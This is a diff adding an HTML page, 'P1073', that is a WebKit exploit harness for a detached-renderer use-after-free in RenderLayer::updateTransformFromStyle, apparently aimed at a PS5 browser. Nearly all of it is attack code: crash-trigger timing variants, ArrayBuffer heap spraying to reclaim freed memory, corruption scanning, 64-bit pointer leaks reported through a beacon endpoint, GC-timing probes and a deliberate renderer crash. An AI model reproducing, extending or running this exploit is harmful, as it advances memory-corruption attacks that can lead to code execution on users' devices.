@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>P1073</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:11px/1.5 monospace;padding:8px;overflow-y:auto}
+.hud{border:1px solid #1a3a1a;border-radius:4px;margin-bottom:6px;padding:6px;background:#0d1117}
+.title{color:#00ff88;font-size:13px;font-weight:bold;margin-bottom:4px}
+.ok{color:#00ff88}.fail{color:#ff4444}.warn{color:#ffaa00}.info{color:#66aaff}
+.sep{border-top:1px solid #1a3a1a;margin:4px 0}
+pre{white-space:pre-wrap;word-break:break-all;font-size:10px}
+#arena{position:fixed;top:-9999px;left:-9999px;width:2000px;height:2000px;overflow:hidden}
+</style>
+</head>
+<body>
+<div class="hud">
+<div class="title">P1073 — DETACHED RENDERER UAF</div>
+<div class="info">Target: RenderLayer::updateTransformFromStyle on detached renderer</div>
+<div class="info">Strategy: same-type reclaim + getComputedStyle confusion + AB spray variants</div>
+</div>
+<div id="log"></div>
+<div id="arena"></div>
+
+<script>
+var L = document.getElementById('log');
+var arena = document.getElementById('arena');
+function log(cls, msg) {
+  var d = document.createElement('div');
+  d.className = cls;
+  d.textContent = msg;
+  L.appendChild(d);
+  L.scrollTop = L.scrollHeight;
+}
+function beacon(tag, data) {
+  var msg = 'P1073-' + tag + ' | ' + data;
+  log('info', '[BCN] ' + msg);
+  try {
+    var img = new Image();
+    img.src = '/en/ps5/beacon.gif?t=' + Date.now() + '&m=' + encodeURIComponent(msg);
+  } catch(e) {}
+}
+function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
+function hex8(v) { return ('0' + v.toString(16)).slice(-2); }
+
+// ============================================================
+// SECTION A: TIMING VARIANT ISOLATION
+// Test different removal timings to find a CONTROLLABLE trigger
+// ============================================================
+
+// A1: setTimeout(0) removal (macrotask)
+async function testA1() {
+  log('warn', '[A1] MutObs + will-change + setTimeout(0) removal...');
+  beacon('PRE-A1', 'settimeout-removal');
+  var c = document.createElement('div');
+  arena.appendChild(c);
+  var count = 0;
+
+  var obs = new MutationObserver(function(muts) {
+    for (var i = 0; i < muts.length; i++) {
+      for (var j = 0; j < muts[i].addedNodes.length; j++) {
+        var node = muts[i].addedNodes[j];
+        if (node.nodeType === 1) {
+          setTimeout(function() {
+            try { c.removeChild(node); } catch(e) {}
+          }, 0);
+        }
+      }
+    }
+  });
+  obs.observe(c, { childList: true });
+
+  for (var i = 0; i < 30; i++) {
+    var el = document.createElement('div');
+    el.style.cssText = 'width:50px;height:50px;will-change:transform;transform:translateZ(0)';
+    c.appendChild(el);
+    count++;
+    await sleep(2);
+  }
+  await sleep(100);
+  obs.disconnect();
+  try { arena.removeChild(c); } catch(e) {}
+  beacon('POST-A1', 'survived:' + count);
+  log('ok', '[A1] SURVIVED ' + count + ' cycles with setTimeout(0)');
+}
+
+// A2: Promise.resolve microtask removal
+async function testA2() {
+  log('warn', '[A2] MutObs + will-change + microtask removal...');
+  beacon('PRE-A2', 'microtask-removal');
+  var c = document.createElement('div');
+  arena.appendChild(c);
+  var count = 0;
+
+  var obs = new MutationObserver(function(muts) {
+    for (var i = 0; i < muts.length; i++) {
+      for (var j = 0; j < muts[i].addedNodes.length; j++) {
+        var node = muts[i].addedNodes[j];
+        if (node.nodeType === 1) {
+          Promise.resolve().then(function() {
+            try { c.removeChild(node); } catch(e) {}
+          });
+        }
+      }
+    }
+  });
+  obs.observe(c, { childList: true });
+
+  for (var i = 0; i < 30; i++) {
+    var el = document.createElement('div');
+    el.style.cssText = 'width:50px;height:50px;will-change:transform;transform:translateZ(0)';
+    c.appendChild(el);
+    count++;
+    await sleep(2);
+  }
+  await sleep(100);
+  obs.disconnect();
+  try { arena.removeChild(c); } catch(e) {}
+  beacon('POST-A2', 'survived:' + count);
+  log('ok', '[A2] SURVIVED ' + count + ' cycles with microtask');
+}
+
+// A3: Double RAF removal (nested)
+async function testA3() {
+  log('warn', '[A3] MutObs + will-change + double-RAF removal...');
+  beacon('PRE-A3', 'double-raf-removal');
+  var c = document.createElement('div');
+  arena.appendChild(c);
+  var count = 0;
+
+  var obs = new MutationObserver(function(muts) {
+    for (var i = 0; i < muts.length; i++) {
+      for (var j = 0; j < muts[i].addedNodes.length; j++) {
+        var node = muts[i].addedNodes[j];
+        if (node.nodeType === 1) {
+          // Double RAF: schedule removal for the SECOND frame
+          requestAnimationFrame(function() {
+            requestAnimationFrame(function() {
+              try { c.removeChild(node); } catch(e) {}
+            });
+          });
+        }
+      }
+    }
+  });
+  obs.observe(c, { childList: true });
+
+  for (var i = 0; i < 30; i++) {
+    var el = document.createElement('div');
+    el.style.cssText = 'width:50px;height:50px;will-change:transform;transform:translateZ(0)';
+    c.appendChild(el);
+    count++;
+    await sleep(2);
+  }
+  await sleep(200);
+  obs.disconnect();
+  try { arena.removeChild(c); } catch(e) {}
+  beacon('POST-A3', 'survived:' + count);
+  log('ok', '[A3] SURVIVED ' + count + ' cycles with double-RAF');
+}
+
+// A4: RAF removal WITHOUT will-change (just transform)
+async function testA4() {
+  log('warn', '[A4] MutObs + transform (no will-change) + RAF removal...');
+  beacon('PRE-A4', 'transform-only');
+  var c = document.createElement('div');
+  arena.appendChild(c);
+  var count = 0;
+
+  var obs = new MutationObserver(function(muts) {
+    for (var i = 0; i < muts.length; i++) {
+      for (var j = 0; j < muts[i].addedNodes.length; j++) {
+        var node = muts[i].addedNodes[j];
+        if (node.nodeType === 1) {
+          requestAnimationFrame(function() {
+            try { c.removeChild(node); } catch(e) {}
+          });
+        }
+      }
+    }
+  });
+  obs.observe(c, { childList: true });
+
+  for (var i = 0; i < 30; i++) {
+    var el = document.createElement('div');
+    el.style.cssText = 'width:50px;height:50px;transform:translateZ(0)'; // NO will-change
+    c.appendChild(el);
+    count++;
+    await sleep(2);
+  }
+  await sleep(100);
+  obs.disconnect();
+  try { arena.removeChild(c); } catch(e) {}
+  beacon('POST-A4', 'survived:' + count);
+  log('ok', '[A4] SURVIVED ' + count + ' cycles with transform-only');
+}
+
+// A5: RAF removal with CSS animation instead of transform
+async function testA5() {
+  log('warn', '[A5] MutObs + CSS animation + will-change + RAF removal...');
+  beacon('PRE-A5', 'css-animation');
+
+  // Add keyframes
+  var style = document.createElement('style');
+  style.textContent = '@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }';
+  document.head.appendChild(style);
+
+  var c = document.createElement('div');
+  arena.appendChild(c);
+  var count = 0;
+
+  var obs = new MutationObserver(function(muts) {
+    for (var i = 0; i < muts.length; i++) {
+      for (var j = 0; j < muts[i].addedNodes.length; j++) {
+        var node = muts[i].addedNodes[j];
+        if (node.nodeType === 1) {
+          requestAnimationFrame(function() {
+            try { c.removeChild(node); } catch(e) {}
+          });
+        }
+      }
+    }
+  });
+  obs.observe(c, { childList: true });
+
+  for (var i = 0; i < 30; i++) {
+    var el = document.createElement('div');
+    el.style.cssText = 'width:50px;height:50px;will-change:transform;animation:spin 0.1s linear infinite';
+    c.appendChild(el);
+    count++;
+    await sleep(2);
+  }
+  await sleep(100);
+  obs.disconnect();
+  try { arena.removeChild(c); } catch(e) {}
+  document.head.removeChild(style);
+  beacon('POST-A5', 'survived:' + count);
+  log('ok', '[A5] SURVIVED ' + count + ' cycles with CSS animation');
+}
+
+// ============================================================
+// SECTION B: SAME-TYPE RECLAIM + PROPERTY CONFUSION
+// Create layers → free one → reclaim with different-sized layer
+// → read properties to detect confusion
+// ============================================================
+
+async function testB_sameTypeReclaim() {
+  log('warn', '[B] Same-type reclaim: layer property confusion...');
+  beacon('PRE-B-RECLAIM', 'starting');
+
+  var c = document.createElement('div');
+  c.style.position = 'relative';
+  arena.appendChild(c);
+
+  // Step 1: Create a "victim" element with known properties
+  var victim = document.createElement('div');
+  victim.id = 'victim';
+  victim.style.cssText = 'position:absolute;width:100px;height:100px;will-change:transform;transform:translateZ(0);background:red;left:10px;top:10px';
+  c.appendChild(victim);
+  c.offsetHeight; // force layout
+
+  // Read victim's properties BEFORE removal
+  var victimRect = victim.getBoundingClientRect();
+  var victimStyle = getComputedStyle(victim);
+  var beforeWidth = victimStyle.width;
+  var beforeHeight = victimStyle.height;
+  var beforeLeft = victimRect.left;
+
+  log('info', '[B] Victim before: w=' + beforeWidth + ' h=' + beforeHeight + ' left=' + beforeLeft);
+
+  // Step 2: Get a WeakRef to the victim (GC detection)
+  var victimRef = new WeakRef(victim);
+
+  // Step 3: Hold a reference to the victim's element but remove from DOM
+  var removedVictim = victim; // keep JS reference
+  c.removeChild(victim);
+
+  // Step 4: IMMEDIATELY create a replacement element with DIFFERENT size
+  var replacements = [];
+  for (var i = 0; i < 20; i++) {
+    var rep = document.createElement('div');
+    rep.style.cssText = 'position:absolute;width:' + (200 + i * 10) + 'px;height:' + (200 + i * 10) + 'px;will-change:transform;transform:translateZ(0);background:blue;left:' + (50 + i) + 'px;top:' + (50 + i) + 'px';
+    c.appendChild(rep);
+    replacements.push(rep);
+  }
+  c.offsetHeight; // force layout
+
+  await sleep(50);
+
+  // Step 5: Check if removed victim's properties changed (type confusion)
+  try {
+    var afterStyle = getComputedStyle(removedVictim);
+    var afterWidth = afterStyle.width;
+    var afterHeight = afterStyle.height;
+    var afterRect = removedVictim.getBoundingClientRect();
+
+    var confused = (beforeWidth !== afterWidth || beforeHeight !== afterHeight);
+    var msg = 'before:w=' + beforeWidth + ',h=' + beforeHeight +
+      '|after:w=' + afterWidth + ',h=' + afterHeight +
+      '|confused:' + confused;
+
+    beacon('B-STYLE', msg);
+    log(confused ? 'ok' : 'warn', '[B] Style confusion: ' + (confused ? 'YES!' : 'no') + ' ' + msg);
+  } catch(e) {
+    beacon('B-STYLE', 'error:' + e.message);
+    log('fail', '[B] getComputedStyle error: ' + e.message);
+  }
+
+  // Step 6: Check WeakRef (has the element been GC'd?)
+  var gcResult = victimRef.deref();
+  beacon('B-GC', 'weakref:' + (gcResult ? 'alive' : 'collected'));
+
+  // Cleanup
+  for (var i = 0; i < replacements.length; i++) {
+    try { c.removeChild(replacements[i]); } catch(e) {}
+  }
+  try { arena.removeChild(c); } catch(e) {}
+}
+
+// ============================================================
+// SECTION C: COMPOSITOR ACCESS AFTER REMOVAL
+// Force the compositor to access a layer AFTER its element
+// is removed. Use getComputedStyle/getClientRects to trigger
+// style recalc on the removed element
+// ============================================================
+
+async function testC_compositorForce() {
+  log('warn', '[C] Force compositor access on removed layers...');
+  beacon('PRE-C-COMPOSITOR', 'starting');
+
+  var c = document.createElement('div');
+  c.style.cssText = 'position:relative;width:500px;height:500px';
+  arena.appendChild(c);
+
+  // Create 50 layers
+  var elements = [];
+  for (var i = 0; i < 50; i++) {
+    var el = document.createElement('div');
+    el.style.cssText = 'position:absolute;width:' + (20 + i) + 'px;height:' + (20 + i) + 'px;will-change:transform;transform:translate(' + (i*5) + 'px,' + (i*5) + 'px);background:rgb(' + (i*5) + ',100,100)';
+    c.appendChild(el);
+    elements.push(el);
+  }
+  c.offsetHeight;
+  await sleep(50);
+
+  // Read all bounding rects BEFORE removal
+  var rectsBefore = [];
+  for (var i = 0; i < elements.length; i++) {
+    rectsBefore.push(elements[i].getBoundingClientRect());
+  }
+
+  // Remove every other element
+  var removed = [];
+  for (var i = 0; i < elements.length; i += 2) {
+    c.removeChild(elements[i]);
+    removed.push(elements[i]);
+  }
+
+  // Force layout recalc
+  c.offsetHeight;
+
+  // Try to read rects of REMOVED elements
+  var confusedCount = 0;
+  var results = [];
+  for (var i = 0; i < removed.length; i++) {
+    try {
+      var rect = removed[i].getBoundingClientRect();
+      var before = rectsBefore[i * 2];
+      var changed = (rect.width !== before.width || rect.height !== before.height ||
+                     rect.left !== before.left || rect.top !== before.top);
+      if (changed) {
+        confusedCount++;
+        results.push(i + ':w' + rect.width + '/h' + rect.height + '/l' + rect.left);
+      }
+    } catch(e) {
+      results.push(i + ':err:' + e.message);
+    }
+  }
+
+  var msg = 'removed:' + removed.length + '|confused:' + confusedCount;
+  if (results.length > 0) {
+    msg += '|first5:' + results.slice(0, 5).join(';');
+  }
+  beacon('POST-C-COMPOSITOR', msg);
+  log(confusedCount > 0 ? 'ok' : 'warn',
+    '[C] Compositor confusion: ' + confusedCount + '/' + removed.length);
+
+  // Cleanup
+  for (var i = 1; i < elements.length; i += 2) {
+    try { c.removeChild(elements[i]); } catch(e) {}
+  }
+  try { arena.removeChild(c); } catch(e) {}
+}
+
+// ============================================================
+// SECTION D: AB SPRAY + SINGLE-SHOT RAF TRIGGER
+// Focused exploit: spray ABs, trigger ONE crash cycle,
+// scan in same frame via microtask before compositor kills us
+// ============================================================
+
+async function testD_sprayAndShoot() {
+  log('warn', '[D] === SPRAY + SINGLE-SHOT RAF UAF ===');
+  beacon('PRE-D-EXPLOIT', 'starting');
+
+  // Spray multiple size classes
+  var SIZES = [128, 192, 256, 320, 384, 448, 512];
+  var PER_SIZE = 300;
+  var spray = {};
+  var views = {};
+
+  for (var si = 0; si < SIZES.length; si++) {
+    var sz = SIZES[si];
+    spray[sz] = [];
+    views[sz] = [];
+    for (var i = 0; i < PER_SIZE; i++) {
+      var ab = new ArrayBuffer(sz);
+      var v = new Uint8Array(ab);
+      // Tag: first 4 bytes = size, next 4 = index, rest = 0x41
+      v[0] = sz & 0xFF;
+      v[1] = (sz >> 8) & 0xFF;
+      v[2] = i & 0xFF;
+      v[3] = (i >> 8) & 0xFF;
+      for (var j = 4; j < sz; j++) v[j] = 0x41;
+      spray[sz].push(ab);
+      views[sz].push(v);
+    }
+  }
+  log('ok', '[D1] Sprayed ' + (SIZES.length * PER_SIZE) + ' ABs');
+
+  // Free alternating to create holes
+  for (var si = 0; si < SIZES.length; si++) {
+    var sz = SIZES[si];
+    for (var i = 0; i < PER_SIZE; i += 2) {
+      spray[sz][i] = null;
+      views[sz][i] = null;
+    }
+  }
+
+  // GC pressure
+  for (var gc = 0; gc < 30; gc++) { var t = new ArrayBuffer(65536); t = null; }
+  await sleep(30);
+  log('ok', '[D2] Freed holes + GC pressure');
+
+  // Create ONE compositor layer
+  var c = document.createElement('div');
+  arena.appendChild(c);
+  var target = document.createElement('div');
+  target.style.cssText = 'width:100px;height:100px;will-change:transform;transform:translateZ(0);background:red';
+  c.appendChild(target);
+  c.offsetHeight;
+  await sleep(30);
+  log('ok', '[D3] Created target compositor layer');
+
+  // Set up MutObs that removes the target in RAF
+  // But ALSO sprays immediately after removal
+  var removed = false;
+  var obs = new MutationObserver(function(muts) {
+    for (var i = 0; i < muts.length; i++) {
+      for (var j = 0; j < muts[i].addedNodes.length; j++) {
+        var node = muts[i].addedNodes[j];
+        if (node.nodeType === 1) {
+          requestAnimationFrame(function() {
+            // Remove the target (triggers RenderLayer free)
+            try { c.removeChild(target); removed = true; } catch(e) {}
+
+            // IMMEDIATELY spray to reclaim freed memory
+            for (var si = 0; si < SIZES.length; si++) {
+              var sz = SIZES[si];
+              for (var k = 0; k < 50; k++) {
+                var ab = new ArrayBuffer(sz);
+                var v = new Uint8Array(ab);
+                // Fill with 0xDD to distinguish from pre-spray
+                for (var j = 0; j < sz; j++) v[j] = 0xDD;
+                spray[sz].push(ab);
+                views[sz].push(v);
+              }
+            }
+          });
+        }
+      }
+    }
+  });
+  obs.observe(c, { childList: true });
+
+  // Trigger: add a new element (MutObs fires, schedules RAF removal+spray)
+  var trigger = document.createElement('div');
+  trigger.style.cssText = 'width:10px;height:10px;will-change:transform;transform:translateZ(0)';
+  c.appendChild(trigger);
+
+  // Wait for RAF cycle
+  await sleep(100);
+  obs.disconnect();
+
+  beacon('D4-REMOVED', 'removed:' + removed);
+  log('ok', '[D4] Target removed: ' + removed);
+
+  // Scan ALL surviving pre-spray buffers for corruption
+  var corrupted = [];
+  var scanned = 0;
+  for (var si = 0; si < SIZES.length; si++) {
+    var sz = SIZES[si];
+    for (var i = 1; i < PER_SIZE; i += 2) {
+      var v = views[sz][i];
+      if (!v) continue;
+      scanned++;
+      for (var j = 4; j < sz; j++) {
+        if (v[j] !== 0x41) {
+          var hex = '';
+          for (var k = 0; k < Math.min(64, sz); k++) hex += hex8(v[k]);
+          corrupted.push({ sz: sz, idx: i, off: j, val: v[j], hex: hex });
+          break;
+        }
+      }
+    }
+  }
+
+  // Also scan post-spray (0xDD) buffers
+  var postCorrupt = [];
+  for (var si = 0; si < SIZES.length; si++) {
+    var sz = SIZES[si];
+    for (var i = PER_SIZE; i < spray[sz].length; i++) {
+      var v = views[sz][i];
+      if (!v) continue;
+      for (var j = 0; j < sz; j++) {
+        if (v[j] !== 0xDD) {
+          var hex = '';
+          for (var k = 0; k < Math.min(64, sz); k++) hex += hex8(v[k]);
+          postCorrupt.push({ sz: sz, idx: i, off: j, val: v[j], hex: hex });
+          break;
+        }
+      }
+    }
+  }
+
+  var msg = 'scanned:' + scanned + '|preCorrupt:' + corrupted.length + '|postCorrupt:' + postCorrupt.length;
+  if (corrupted.length > 0) {
+    msg += '|HIT:sz=' + corrupted[0].sz + ',off=' + corrupted[0].off +
+      ',val=0x' + corrupted[0].val.toString(16) + ',hex=' + corrupted[0].hex.substring(0, 32);
+  }
+  if (postCorrupt.length > 0) {
+    msg += '|PHIT:sz=' + postCorrupt[0].sz + ',off=' + postCorrupt[0].off +
+      ',val=0x' + postCorrupt[0].val.toString(16);
+  }
+  beacon('D5-SCAN', msg);
+
+  if (corrupted.length > 0 || postCorrupt.length > 0) {
+    log('ok', '*** CORRUPTION FOUND! ***');
+    var all = corrupted.concat(postCorrupt);
+    for (var i = 0; i < Math.min(all.length, 5); i++) {
+      var c2 = all[i];
+      log('ok', '  sz=' + c2.sz + ' idx=' + c2.idx + ' off=' + c2.off + ' hex=' + c2.hex.substring(0, 40));
+      beacon('D-HIT-' + i, 'sz:' + c2.sz + '|off:' + c2.off + '|hex:' + c2.hex);
+
+      // 64-bit pointer read
+      var ab = spray[c2.sz] ? spray[c2.sz][c2.idx] : null;
+      if (ab) {
+        try {
+          var bv = new BigUint64Array(ab);
+          var ptrs = '';
+          for (var p = 0; p < Math.min(bv.length, 8); p++) {
+            ptrs += p + ':0x' + bv[p].toString(16) + '|';
+          }
+          beacon('D-PTR-' + i, ptrs);
+          log('ok', '  ptrs: ' + ptrs.substring(0, 200));
+        } catch(e) {}
+      }
+    }
+  } else {
+    log('warn', '[D5] No corruption in ' + scanned + ' pre-spray + ' + (spray[SIZES[0]].length - PER_SIZE) + ' post-spray buffers');
+  }
+
+  try { arena.removeChild(c); } catch(e) {}
+  return corrupted.length + postCorrupt.length;
+}
+
+// ============================================================
+// SECTION E: FINALIZATIONREGISTRY UAF TIMING
+// Use FinalizationRegistry to detect WHEN the RenderLayer is GC'd
+// Then spray immediately after the finalizer fires
+// ============================================================
+
+async function testE_finalizerTiming() {
+  log('warn', '[E] FinalizationRegistry timing for layer GC...');
+  beacon('PRE-E-FINALIZER', 'starting');
+
+  var layerFreed = false;
+  var freeTime = 0;
+  var registry = new FinalizationRegistry(function(label) {
+    layerFreed = true;
+    freeTime = Date.now();
+    log('ok', '[E] FinalizationRegistry: "' + label + '" was collected!');
+    beacon('E-FREED', 'label:' + label + '|time:' + freeTime);
+  });
+
+  var c = document.createElement('div');
+  arena.appendChild(c);
+
+  // Create element, register it, then orphan it
+  (function() {
+    var el = document.createElement('div');
+    el.style.cssText = 'width:100px;height:100px;will-change:transform;transform:translateZ(0)';
+    c.appendChild(el);
+    c.offsetHeight;
+
+    registry.register(el, 'compositor-layer');
+
+    // Remove and null the reference
+    c.removeChild(el);
+    el = null;
+  })();
+
+  // GC pressure
+  log('info', '[E] Applying GC pressure...');
+  for (var gc = 0; gc < 50; gc++) {
+    var tmp = new ArrayBuffer(65536);
+    tmp = null;
+    if (gc % 10 === 0) await sleep(10);
+  }
+  await sleep(200);
+
+  // More pressure
+  for (var gc = 0; gc < 100; gc++) {
+    var tmp = new ArrayBuffer(32768);
+    tmp = null;
+  }
+  await sleep(500);
+
+  beacon('E-RESULT', 'freed:' + layerFreed + '|freeTime:' + freeTime);
+  log(layerFreed ? 'ok' : 'warn', '[E] Layer element GC: ' + (layerFreed ? 'COLLECTED at ' + freeTime : 'NOT collected'));
+
+  try { arena.removeChild(c); } catch(e) {}
+}
+
+// ============================================================
+// SECTION F: CRASH PATTERN (LAST — kills WebProcess)
+// Only if we haven't crashed from earlier tests
+// ============================================================
+
+async function testF_crashConfirm() {
+  log('warn', '[F] FULL CRASH PATTERN (MutObs + will-change + RAF)...');
+  log('warn', '[F] This WILL crash WebProcess...');
+  beacon('PRE-F-CRASH', 'expect-crash');
+
+  var c = document.createElement('div');
+  arena.appendChild(c);
+
+  var obs = new MutationObserver(function(muts) {
+    for (var i = 0; i < muts.length; i++) {
+      for (var j = 0; j < muts[i].addedNodes.length; j++) {
+        var node = muts[i].addedNodes[j];
+        if (node.nodeType === 1) {
+          requestAnimationFrame(function() {
+            try { c.removeChild(node); } catch(e) {}
+          });
+        }
+      }
+    }
+  });
+  obs.observe(c, { childList: true });
+
+  for (var i = 0; i < 40; i++) {
+    var el = document.createElement('div');
+    el.style.cssText = 'width:50px;height:50px;will-change:transform;transform:translateZ(0)';
+    c.appendChild(el);
+    await sleep(2);
+  }
+  await sleep(100);
+  obs.disconnect();
+  try { arena.removeChild(c); } catch(e) {}
+
+  // If we get here, crash didn't happen (unlikely)
+  beacon('POST-F-NO-CRASH', 'survived-40-cycles');
+  log('fail', '[F] Expected crash but survived!');
+}
+
+// ============================================================
+// MAIN
+// ============================================================
+
+async function run() {
+  beacon('BOOT', 'detached-renderer-uaf');
+  log('ok', '=== P1073 DETACHED RENDERER UAF ===');
+  log('info', 'Research: WebKit PR #77362 fixes updateTransformFromStyle on detached renderer');
+  log('info', 'Strategy: timing variants + same-type reclaim + AB spray + finalizer timing');
+
+  // Section A: Timing variants
+  log('warn', '--- SECTION A: TIMING VARIANTS ---');
+  await testA1(); await sleep(100);
+  await testA2(); await sleep(100);
+  await testA3(); await sleep(100);
+  await testA4(); await sleep(100);
+  await testA5(); await sleep(100);
+
+  // Section B: Same-type reclaim
+  log('warn', '--- SECTION B: SAME-TYPE RECLAIM ---');
+  await testB_sameTypeReclaim(); await sleep(100);
+
+  // Section C: Compositor access
+  log('warn', '--- SECTION C: COMPOSITOR ACCESS ---');
+  await testC_compositorForce(); await sleep(100);
+
+  // Section D: AB spray + shoot
+  log('warn', '--- SECTION D: SPRAY + SHOOT ---');
+  var dHits = await testD_sprayAndShoot(); await sleep(200);
+
+  // Section E: Finalizer timing
+  log('warn', '--- SECTION E: FINALIZER TIMING ---');
+  await testE_finalizerTiming(); await sleep(100);
+
+  // Section F: Crash confirm (LAST)
+  log('warn', '--- SECTION F: CRASH CONFIRMATION ---');
+  await testF_crashConfirm();
+
+  beacon('DONE', 'all-complete');
+  log('ok', '=== P1073 COMPLETE ===');
+}
+
+run();
+</script>
+</body>
+</html>
